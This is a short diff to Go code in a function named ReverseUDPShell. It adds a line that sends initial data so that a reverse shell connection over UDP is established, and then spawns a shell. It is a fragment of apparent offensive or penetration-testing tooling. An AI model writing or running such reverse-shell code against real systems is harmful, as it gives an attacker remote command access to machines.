@@ -176,6 +176,7 @@ func ReverseUDPShell(filepath string, host string, port int) {
 		fmt.Println(string(err.Error()))
 		return
 	}
+	target_conn.Write([]byte("\n")) //you must send some initial data in order to establish the reverse connection over UDP
 	defer target_conn.Close()
 	//spawn the shell
 	session,err := spawnShell(filepath)
